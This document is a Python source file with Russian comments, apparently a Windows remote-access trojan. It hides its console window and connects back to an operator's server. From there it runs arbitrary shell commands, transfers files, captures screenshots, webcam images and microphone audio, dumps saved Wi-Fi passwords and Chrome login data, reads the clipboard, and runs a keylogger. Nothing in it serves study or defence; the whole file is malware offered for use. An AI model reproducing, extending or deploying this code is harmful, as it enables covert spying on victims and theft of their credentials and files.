# -*- coding: utf-8 -*-
import socket
import os
import subprocess
import sys
import time
import json
import base64
import ctypes
import threading

# ========== МГНОВЕННОЕ СКРЫТИЕ КОНСОЛИ ==========
if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    ctypes.windll.kernel32.SetConsoleCtrlHandler(None, 1)
# =================================================

# ========== НАСТРОЙКИ ==========
SERVER_IP = "192.168.31.177"  # ⚡ ИЗМЕНИ НА IP СВОЕГО СЕРВЕРА
SERVER_PORT = 5555
# ===============================

# Глобальные переменные для кейлоггера
keylog_data = []
keylog_running = False

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
def run_powershell(script):
    """Выполняет PowerShell скрипт и возвращает результат"""
    try:
        result = subprocess.run(
            ["powershell", "-Command", script],
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.stdout + result.stderr
    except:
        return "Error"

# ===== СКРИНШОТ (без PIL) =====
def take_screenshot():
    try:
        import win32gui
        import win32ui
        import win32con
        from PIL import Image
        import io
        
        hdesktop = win32gui.GetDesktopWindow()
        left, top, right, bottom = win32gui.GetWindowRect(hdesktop)
        width = right - left
        height = bottom - top
        
        hwnd_dc = win32gui.GetWindowDC(hdesktop)
        mfc_dc = win32ui.CreateDCFromHandle(hwnd_dc)
        save_dc = mfc_dc.CreateCompatibleDC()
        
        bitmap = win32ui.CreateBitmap()
        bitmap.CreateCompatibleBitmap(mfc_dc, width, height)
        save_dc.SelectObject(bitmap)
        save_dc.BitBlt((0,0), (width, height), mfc_dc, (0,0), win32con.SRCCOPY)
        
        bmpinfo = bitmap.GetInfo()
        bmpstr = bitmap.GetBitmapBits(True)
        img = Image.frombuffer('RGB', (bmpinfo['bmWidth'], bmpinfo['bmHeight']), bmpstr, 'raw', 'BGRX', 0, 1)
        
        win32gui.DeleteObject(bitmap.GetHandle())
        mfc_dc.DeleteDC()
        save_dc.DeleteDC()
        win32gui.ReleaseDC(hdesktop, hwnd_dc)
        
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        return img_bytes.getvalue()
        
    except Exception as e:
        return f"SCREEN_ERROR:{str(e)}".encode()

# ===== ВЕБ-КАМЕРА =====
def take_webcam_photo():
    """Фото с веб-камеры через PowerShell"""
    try:
        script = '''
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
$webcam = New-Object -ComObject WIA.ImageFile
$deviceManager = New-Object -ComObject WIA.DeviceManager
$deviceInfo = $deviceManager.DeviceInfos | Where-Object {$_.Type -eq 1} | Select-Object -First 1
if ($deviceInfo) {
    $device = $deviceInfo.Connect()
    $item = $device.ExecuteCommand("{00000000-0000-0000-0000-000000000000}")
    $path = [System.IO.Path]::GetTempFileName() + ".jpg"
    $item.Transfer("{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}").SaveFile($path)
    [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($path))
    Remove-Item $path
}
'''
        result = run_powershell(script)
        if result and len(result) > 100:
            return base64.b64decode(result)
        else:
            return b"WEBCAM_ERROR: No camera"
    except:
        return b"WEBCAM_ERROR: Failed"

# ===== МИКРОФОН =====
def record_mic(duration):
    """Запись микрофона через PowerShell"""
    try:
        script = f'''
$path = [System.IO.Path]::GetTempFileName() + ".wav"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Speech
$speech = New-Object System.Speech.AudioFormat.SpeechAudioFormatInfo(8000, 16, 1)
$capture = New-Object System.Speech.Recognition.SpeechRecognitionEngine
$capture.SetInputToDefaultAudioDevice()
$capture.RecognizeAsyncMode = [System.Speech.Recognition.RecognizeAsyncMode]::Multiple
$capture.RecognizeAsync()
Start-Sleep -Seconds {duration}
$capture.RecognizeAsyncStop()
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($path))
Remove-Item $path
'''
        result = run_powershell(script)
        if result and len(result) > 100:
            return base64.b64decode(result)
        else:
            return b"MIC_ERROR: No mic"
    except:
        return b"MIC_ERROR: Failed"

# ===== ПРОЦЕССЫ =====
def get_processes():
    result = subprocess.run(["tasklist", "/FO", "CSV"], capture_output=True, text=True)
    return result.stdout

def kill_process(pid):
    result = subprocess.run(["taskkill", "/F", "/PID", pid], capture_output=True, text=True)
    return result.stdout + result.stderr

# ===== СЕТЬ =====
def get_ipconfig():
    return run_powershell("Get-NetIPConfiguration | Out-String")

def get_arp():
    return run_powershell("Get-NetNeighbor -AddressFamily IPv4 | Out-String")

def get_ports():
    return run_powershell("Get-NetTCPConnection | Out-String")

# ===== ПАРОЛИ =====
def get_wifi_passwords():
    script = '''
$profiles = netsh wlan show profiles | Select-String ":" | ForEach-Object {
    $name = ($_ -split ":")[1].Trim()
    if ($name) {
        $result = netsh wlan show profile name="$name" key=clear
        $password = $result | Select-String "Key Content" | ForEach-Object {
            $_ -split ": " | Select-Object -Last 1
        }
        [PSCustomObject]@{
            SSID = $name
            Password = $password
        }
    }
}
$profiles | ConvertTo-Json
'''
    return run_powershell(script)

def get_chrome_passwords():
    script = '''
$path = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
if (Test-Path $path) {
    Copy-Item $path "$env:TEMP\\logins.db"
    $conn = New-Object System.Data.SQLite.SQLiteConnection
    $conn.ConnectionString = "Data Source=$env:TEMP\\logins.db"
    $conn.Open()
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    $reader = $cmd.ExecuteReader()
    $results = @()
    while ($reader.Read()) {
        $results += [PSCustomObject]@{
            URL = $reader["origin_url"]
            Username = $reader["username_value"]
            Password = "encrypted"
        }
    }
    $results | ConvertTo-Json
    Remove-Item "$env:TEMP\\logins.db"
}
'''
    return run_powershell(script)

# ===== БУФЕР ОБМЕНА =====
def get_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return str(data)
    except:
        return "(пусто)"

# ===== КЕЙЛОГГЕР =====
def keylogger_start():
    global keylog_running, keylog_data
    if keylog_running:
        return
    
    keylog_running = True
    keylog_data = []
    
    def hook():
        import pythoncom
        import pyHook
        
        def on_key(event):
            global keylog_data
            if event.Ascii:
                keylog_data.append(chr(event.Ascii))
            else:
                keylog_data.append(f"[{event.Key}]")
            return True
        
        hm = pyHook.HookManager()
        hm.KeyDown = on_key
        hm.HookKeyboard()
        pythoncom.PumpMessages()
    
    thread = threading.Thread(target=hook)
    thread.daemon = True
    thread.start()

# ===== ИНФОРМАЦИЯ О СИСТЕМЕ =====
def get_system_info():
    info = []
    info.append(f"Computer: {os.getenv('COMPUTERNAME', 'Unknown')}")
    info.append(f"User: {os.getenv('USERNAME', 'Unknown')}")
    info.append(f"OS: {os.getenv('OS', 'Unknown')}")
    info.append(f"Arch: {os.getenv('PROCESSOR_ARCHITECTURE', 'Unknown')}")
    info.append(f"Current Dir: {os.getcwd()}")
    info.append(f"IP: {socket.gethostbyname(socket.gethostname())}")
    return "\n".join(info)

# ===== ФАЙЛОВЫЙ МЕНЕДЖЕР =====
def list_files(path):
    try:
        files = os.listdir(path if path else ".")
        result = f"Directory: {os.path.abspath(path if path else '.')}\n"
        result += "-"*50 + "\n"
        for f in sorted(files):
            full = os.path.join(path if path else ".", f)
            if os.path.isdir(full):
                result += f"📁 [DIR]  {f}\n"
            else:
                size = os.path.getsize(full)
                result += f"📄 [FILE] {f} ({size} bytes)\n"
        return result
    except Exception as e:
        return f"Error: {str(e)}"

# ===== ОТПРАВКА ФАЙЛА =====
def send_file(sock, path):
    try:
        if not os.path.exists(path):
            sock.send(b"ERROR: File not found")
            return
        size = os.path.getsize(path)
        sock.send(str(size).encode())
        ack = sock.recv(1024)
        with open(path, "rb") as f:
            sock.sendall(f.read())
    except Exception as e:
        try:
            sock.send(f"ERROR:{str(e)}".encode())
        except:
            pass

# ===== ПОЛУЧЕНИЕ ФАЙЛА =====
def receive_file(sock, path, size):
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as f:
            received = 0
            while received < size:
                chunk = sock.recv(min(4096, size - received))
                if not chunk:
                    break
                f.write(chunk)
                received += len(chunk)
        return True
    except:
        return False

# ===== ПОДКЛЮЧЕНИЕ =====
def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(5)

# ===== ОСНОВНОЙ ЦИКЛ =====
if __name__ == "__main__":
    while True:
        try:
            sock = connect()
            sock.send(b"WINDOWS_MEGA_READY")
            
            while True:
                try:
                    cmd = sock.recv(4096).decode().strip()
                    if not cmd:
                        break
                    
                    # ===== БАЗОВЫЕ КОМАНДЫ =====
                    if cmd == "EXIT":
                        sock.close()
                        sys.exit(0)
                    
                    elif cmd == "RECONNECT":
                        sock.close()
                        break
                    
                    elif cmd == "SYSTEM_INFO":
                        sock.send(get_system_info().encode())
                    
                    elif cmd.startswith("LIST "):
                        path = cmd[5:].strip()
                        result = list_files(path)
                        sock.send(result.encode())
                    
                    elif cmd.startswith("CD "):
                        path = cmd[3:].strip()
                        try:
                            os.chdir(path if path else os.path.expanduser("~"))
                            sock.send(f"OK: {os.getcwd()}".encode())
                        except Exception as e:
                            sock.send(f"ERROR: {str(e)}".encode())
                    
                    elif cmd.startswith("GET "):
                        path = cmd[4:].strip()
                        send_file(sock, path)
                    
                    elif cmd.startswith("UPLOAD "):
                        parts = cmd[7:].split("|")
                        if len(parts) == 2:
                            path, size = parts[0], int(parts[1])
                            sock.send(b"READY")
                            if receive_file(sock, path, size):
                                sock.send(b"UPLOAD OK")
                            else:
                                sock.send(b"UPLOAD ERROR")
                    
                    elif cmd == "SCREEN":
                        result = take_screenshot()
                        if isinstance(result, bytes) and not result.startswith(b"SCREEN_ERROR"):
                            sock.send(str(len(result)).encode())
                            ack = sock.recv(1024)
                            sock.sendall(result)
                        else:
                            sock.send(result if isinstance(result, bytes) else result.encode())
                    
                    elif cmd.startswith("CMD "):
                        command = cmd[4:].strip()
                        try:
                            result = subprocess.run(
                                command,
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=30
                            )
                            output = result.stdout + result.stderr
                            sock.send(output.encode() if output else b"OK")
                        except Exception as e:
                            sock.send(f"ERROR: {str(e)}".encode())
                    
                    # ===== РАСШИРЕННЫЕ КОМАНДЫ =====
                    elif cmd == "WEBCAM":
                        result = take_webcam_photo()
                        if isinstance(result, bytes) and not result.startswith(b"WEBCAM_ERROR"):
                            sock.send(str(len(result)).encode())
                            ack = sock.recv(1024)
                            sock.sendall(result)
                        else:
                            sock.send(result)
                    
                    elif cmd.startswith("MIC "):
                        duration = cmd[4:].strip()
                        if duration.isdigit():
                            result = record_mic(int(duration))
                            if isinstance(result, bytes) and not result.startswith(b"MIC_ERROR"):
                                sock.send(str(len(result)).encode())
                                ack = sock.recv(1024)
                                sock.sendall(result)
                            else:
                                sock.send(result)
                    
                    elif cmd == "PS_LIST":
                        sock.send(get_processes().encode())
                    
                    elif cmd.startswith("PS_KILL "):
                        pid = cmd[8:].strip()
                        sock.send(kill_process(pid).encode())
                    
                    elif cmd == "NET_IPCONFIG":
                        sock.send(get_ipconfig().encode())
                    
                    elif cmd == "NET_ARP":
                        sock.send(get_arp().encode())
                    
                    elif cmd == "NET_PORTS":
                        sock.send(get_ports().encode())
                    
                    elif cmd == "PASS_WIFI":
                        sock.send(get_wifi_passwords().encode())
                    
                    elif cmd == "PASS_CHROME":
                        sock.send(get_chrome_passwords().encode())
                    
                    elif cmd == "CLIPBOARD":
                        sock.send(get_clipboard().encode())
                    
                    elif cmd == "KEYLOG_START":
                        keylogger_start()
                        sock.send(b"Keylogger started")
                    
                    elif cmd == "KEYLOG_GET":
                        global keylog_data
                        sock.send("".join(keylog_data[-500:]).encode())
                    
                    else:
                        sock.send(b"UNKNOWN COMMAND")
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    break
                    
            sock.close()
        except:
            time.sleep(5)
